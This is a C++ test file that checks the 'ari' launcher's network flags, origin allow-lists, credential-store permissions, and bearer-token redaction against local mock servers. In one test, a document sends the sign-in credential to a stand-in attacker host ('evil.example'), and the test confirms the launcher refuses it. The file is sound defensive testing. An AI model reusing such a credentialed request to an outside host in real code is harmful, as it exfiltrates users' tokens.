// ari's network flags end to end (docs/ARIADNE.md §10.3): the ari binary, run as a launcher would,
// against localhost servers shaped like txwtf's sign-in. Each run's whole output, stdout and
// stderr, is checked for what the document's requests brought back, and for the token, which no
// output may carry: not a frame, not a warning, not an error, whichever path fails.

#include "../cvc/tests/local_http_server.h"
#include "ari_run.h"

#include <filesystem>
#include <gtest/gtest.h>
#include <string>
#include <vector>

namespace fs = std::filesystem;
using ari_test::ari;
using ari_test::AriRun;
using ari_test::quoted;
using ari_test::TempDir;
using cvc_test::LocalHttpServer;

namespace {

const std::string kToken = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhcmkifQ.YXJpLW5ldC10ZXN0LXNpZw";

// txwtf's shape. /user/login answers {user, expires, token, session_uuid}; /user/badtoken the same
// with a token that is no bearer token; /user/me wants the bearer token; /echo hands back the
// Authorization it was sent, in a header and the body.
LocalHttpServer::Reply txwtf(const LocalHttpServer::Request &req) {
  const auto login = [](const std::string &token) {
    return LocalHttpServer::Reply{200,
                                  {"Content-Type: application/json"},
                                  "{\"user\": {\"name\": \"ari\"}, \"expires\": 1730000000, "
                                  "\"token\": \"" +
                                      token + "\", \"session_uuid\": \"s-1\"}"};
  };
  if (req.target == "/user/login")
    return login(kToken);
  if (req.target == "/user/badtoken")
    return login(kToken + " not-a-bearer-token");
  if (req.target == "/user/me")
    return req.header("Authorization") == "Bearer " + kToken
               ? LocalHttpServer::Reply{200, {"Content-Type: application/json"}, "{\"scrip\": 42}"}
               : LocalHttpServer::Reply{401, {}, "{}"};
  if (req.target == "/echo")
    return {
        200, {"X-Echo: " + req.header("Authorization")}, "you sent " + req.header("Authorization")};
  return {404, {}, ""};
}

// A document that runs `program` once, from its first tick, and shows `keys` (state nodes under
// t.) one a line. requires: names what it needs from the host.
std::string document(const std::string &requires_, const std::vector<std::string> &keys,
                     const std::string &program) {
  std::string doc = "requires: [" + requires_ + "]\nwindows:\n  - window: Net\n    children:\n";
  for (const std::string &k : keys)
    doc += "      - text: \"" + k + "\"\n        bind: (state-get \"t." + k + "\")\n";
  doc += "init: (state-set \"t.started\" \"\")\n"
         "on_tick: |\n"
         "  (if (= (state-get \"t.started\") \"\")\n"
         "    (begin (state-set \"t.started\" \"1\")\n"
         "      " +
         program + "))\n";
  return doc;
}

std::string sign_in(const std::string &url) {
  return "(set r (http-request \"POST\" \"" + url +
         "\" (dict \"form\" (dict \"username\" \"ari\")"
         " \"capture_auth\" (dict \"name\" \"txwtf\"))))"
         " (state-set \"t.login\" (get-attr r \"status\"))"
         " (state-set \"t.captured\" (get-attr r \"captured\"))"
         " (state-set \"t.body\" (str (get-attr r \"body\")))"
         " (state-set \"t.error\" (get-attr r \"error\"))";
}

bool have_terminal_ari() {
  const AriRun r = ari("info");
  return r.status == 0 && r.output.find("terminal backend (FTXUI)      yes") != std::string::npos &&
         r.output.find(".ari loader (yaml-cpp)        yes") != std::string::npos &&
         r.output.find("HTTP (cvc::net)               yes") != std::string::npos;
}

#define REQUIRE_ARI()                                                                              \
  do {                                                                                             \
    if (!have_terminal_ari())                                                                      \
      GTEST_SKIP() << "ari lacks FTXUI, yaml-cpp or an HTTP backend";                              \
  } while (0)

} // namespace

TEST(AriNet, ADocumentThatNeedsTheNetworkFailsWithoutTheFlags) {
  REQUIRE_ARI();
  TempDir dir;
  const fs::path doc =
      dir.write("needs.ari", document("net, net.auth", {"x"}, "(state-set \"t.x\" 1)"));
  for (const char *cmd : {"check", "snapshot"}) {
    const AriRun r = ari(std::string(cmd) + " " + quoted(doc));
    EXPECT_EQ(r.status, 1) << cmd << ": " << r.output;
    EXPECT_NE(r.output.find("does not provide what the document requires: net"), std::string::npos)
        << r.output;
  }
  for (const char *backend : {"ftxui", "tvision"}) {
    const AriRun r = ari(std::string("check --backend ") + backend + " --net " + quoted(doc));
    EXPECT_EQ(r.status, 0) << backend << ": " << r.output;
  }
}

TEST(AriNet, SnapshotSignsInFetchesAndIsRefusedElsewhere) {
  REQUIRE_ARI();
  LocalHttpServer api(txwtf);
  TempDir dir;
  const fs::path doc =
      dir.write("hello.ari",
                document("net, net.auth", {"login", "captured", "body", "me", "evil"},
                         sign_in(api.url("/user/login")) +
                             " (state-set \"t.me\" (get-attr (http-get \"" + api.url("/user/me") +
                             "\" (dict \"auth\" \"txwtf\")) \"status\"))"
                             " (state-set \"t.evil\" (get-attr (http-get "
                             "\"https://evil.example/\" (dict \"auth\" \"txwtf\")) \"error\"))"));
  for (const char *backend : {"ftxui", "tvision"}) {
    SCOPED_TRACE(backend);
    const AriRun r = ari(std::string("snapshot --backend ") + backend + " --net-allow " +
                         api.origin() + " --width 120 --height 12 " + quoted(doc));
    EXPECT_EQ(r.status, 0) << r.output;
    EXPECT_NE(r.output.find("login: 200"), std::string::npos) << r.output;
    EXPECT_NE(r.output.find("captured: true"), std::string::npos) << r.output;
    EXPECT_NE(r.output.find("\\\"token\\\": \\\"[redacted]\\\""), std::string::npos) << r.output;
    EXPECT_NE(r.output.find("me: 200"), std::string::npos) << r.output;
    EXPECT_NE(r.output.find("https://evil.example is not an origin this host allows"),
              std::string::npos)
        << r.output;
    EXPECT_EQ(r.output.find(kToken), std::string::npos) << "the token reached the terminal";
  }
  int bearer = 0;
  for (const LocalHttpServer::Request &req : api.requests()) {
    if (req.target == "/user/login")
      EXPECT_EQ(req.header("Authorization"), "");
    if (req.target == "/user/me" && req.header("Authorization") == "Bearer " + kToken)
      ++bearer;
  }
  EXPECT_EQ(bearer, 2) << "each run's /user/me carried the host's token";
}

TEST(AriNet, ACredentialStoreCarriesTheSignInToTheNextRun) {
  REQUIRE_ARI();
  LocalHttpServer api(txwtf);
  TempDir dir;
  const fs::path store = dir.path / "store" / "credentials";
  const fs::path first = dir.write(
      "first.ari", document("net.auth.persist", {"captured"}, sign_in(api.url("/user/login"))));
  const fs::path second =
      dir.write("second.ari",
                document("net.auth.persist", {"has", "me"},
                         "(state-set \"t.has\" (net-auth-has? \"txwtf\" \"" + api.url("/") +
                             "\")) (state-set \"t.me\" (get-attr (http-get \"" +
                             api.url("/user/me") + "\" (dict \"auth\" \"txwtf\")) \"status\"))"));
  const std::string flags = "--net-allow " + api.origin() + " --credential-store " + quoted(store);
  AriRun r = ari("snapshot " + flags + " " + quoted(first));
  EXPECT_NE(r.output.find("captured: true"), std::string::npos) << r.output;
  ASSERT_TRUE(fs::exists(store));
#if !defined(_WIN32)
  struct stat st {};
  ASSERT_EQ(::stat(store.c_str(), &st), 0);
  EXPECT_EQ(st.st_mode & 0777, 0600u);
#endif
  r = ari("snapshot " + flags + " " + quoted(second));
  EXPECT_NE(r.output.find("has: true"), std::string::npos) << r.output;
  EXPECT_NE(r.output.find("me: 200"), std::string::npos) << r.output;
  EXPECT_EQ(r.output.find(kToken), std::string::npos);
  // Without the store the next run has no credential, and the document says so at load.
  r = ari("check --net-allow " + api.origin() + " " + quoted(second));
  EXPECT_EQ(r.status, 1);
  EXPECT_NE(r.output.find("net.auth.persist"), std::string::npos) << r.output;
}

TEST(AriNet, NoErrorPathPrintsTheToken) {
  REQUIRE_ARI();
  LocalHttpServer api(txwtf);
  TempDir dir;
  const std::string allow = "--net-allow " + api.origin() + " ";
  std::vector<std::pair<std::string, AriRun>> runs;

  // A reply whose token is no bearer token: kept nowhere, blanked anyway, the error printed.
  const fs::path bad = dir.write("bad.ari", document("net.auth", {"captured", "error", "body"},
                                                     sign_in(api.url("/user/badtoken"))));
  runs.emplace_back("bad token", ari("snapshot " + allow + "--width 160 " + quoted(bad)));
  EXPECT_NE(runs.back().second.output.find("captured: false"), std::string::npos)
      << runs.back().second.output;
  EXPECT_NE(runs.back().second.output.find("not a bearer token"), std::string::npos)
      << runs.back().second.output;

  // A credential file that cannot be written: the sign-in still works and says why it is not kept.
  const fs::path blocker = dir.write("not-a-dir", "x");
  runs.emplace_back("unwritable store",
                    ari("snapshot " + allow + "--width 200 --credential-store " +
                        quoted(blocker / "credentials") + " " +
                        quoted(dir.write("w.ari", document("net.auth", {"captured", "error"},
                                                           sign_in(api.url("/user/login")))))));
  EXPECT_NE(runs.back().second.output.find("could not write the credential store"),
            std::string::npos)
      << runs.back().second.output;

  // An endpoint that echoes the header, shown in full, and a program that raises with the reply.
  runs.emplace_back(
      "echo and raise",
      ari("snapshot " + allow + "--width 160 " +
          quoted(dir.write("echo.ari",
                           document("net.auth", {"echo", "headers"},
                                    sign_in(api.url("/user/login")) + " (set e (http-get \"" +
                                        api.url("/echo") +
                                        "\" (dict \"auth\" \"txwtf\")))"
                                        " (state-set \"t.echo\" (str (get-attr e \"body\")))"
                                        " (state-set \"t.headers\" (str (get-attr e \"headers\")))"
                                        " (error (str e))")))));
  EXPECT_NE(runs.back().second.output.find("you sent Bearer [redacted]"), std::string::npos)
      << runs.back().second.output;
  EXPECT_NE(runs.back().second.output.find("ari: warning:"), std::string::npos)
      << "the program's error is printed: " << runs.back().second.output;

  // The credential sent to a server that is gone (a policy binds it there too).
  const std::string gone = "http://127.0.0.1:1";
  const fs::path policy =
      dir.write("net.policy", "allow " + api.origin() + "\nallow " + gone + "\ncredential txwtf " +
                                  api.origin() + " " + gone + "\n");
  runs.emplace_back(
      "server gone",
      ari("snapshot --net-policy " + quoted(policy) + " --width 160 " +
          quoted(dir.write("gone.ari",
                           document("net.auth", {"gone"},
                                    sign_in(api.url("/user/login")) +
                                        " (state-set \"t.gone\" (get-attr (http-get \"" + gone +
                                        "/x\" (dict \"auth\" \"txwtf\")) \"error\"))")))));
  EXPECT_NE(runs.back().second.output.find("gone: cvc::net: "), std::string::npos)
      << runs.back().second.output;

  // Credential files ari refuses to load, each holding the token.
  const fs::path plain =
      dir.write("needs.ari", document("net.auth", {"x"}, "(state-set \"t.x\" 1)"));
  const fs::path malformed =
      dir.write("malformed", "txwtf " + api.origin() + " " + kToken + " extra\n");
  fs::permissions(malformed, fs::perms::owner_read | fs::perms::owner_write);
  runs.emplace_back("malformed store", ari("check " + allow + "--credential-store " +
                                           quoted(malformed) + " " + quoted(plain)));
  EXPECT_EQ(runs.back().second.status, 2) << runs.back().second.output;
#if !defined(_WIN32)
  const fs::path open = dir.write("open", "txwtf " + api.origin() + " " + kToken + "\n");
  ::chmod(open.c_str(), 0644);
  runs.emplace_back("store open to others", ari("check " + allow + "--credential-store " +
                                                quoted(open) + " " + quoted(plain)));
  EXPECT_EQ(runs.back().second.status, 2) << runs.back().second.output;
  EXPECT_NE(runs.back().second.output.find("open to other users"), std::string::npos)
      << runs.back().second.output;
#endif

  for (const auto &[what, run] : runs)
    EXPECT_EQ(run.output.find(kToken), std::string::npos)
        << what << ": the token reached the terminal:\n"
        << run.output;
}

TEST(AriNet, BadFlagsExitTwo) {
  REQUIRE_ARI();
  TempDir dir;
  const fs::path doc = dir.write("d.ari", document("", {"x"}, "(state-set \"t.x\" 1)"));
  struct Case {
    const char *flags, *says;
  } cases[] = {
      {"--net-allow https://tx.wtf/api", "is a URL, not an origin"},
      {"--net-allow ftp://tx.wtf", "not an http(s) URL"},
      {"--net-policy /nonexistent/net.policy", "cannot read the net policy"},
      {"--net=1", "--net takes no value"},
  };
  for (const Case &c : cases) {
    const AriRun r = ari(std::string("check ") + c.flags + " " + quoted(doc));
    EXPECT_EQ(r.status, 2) << c.flags << ": " << r.output;
    EXPECT_NE(r.output.find(c.says), std::string::npos) << c.flags << ": " << r.output;
  }
  EXPECT_NE(ari("--help").output.find("--net-allow ORIGIN"), std::string::npos);
}
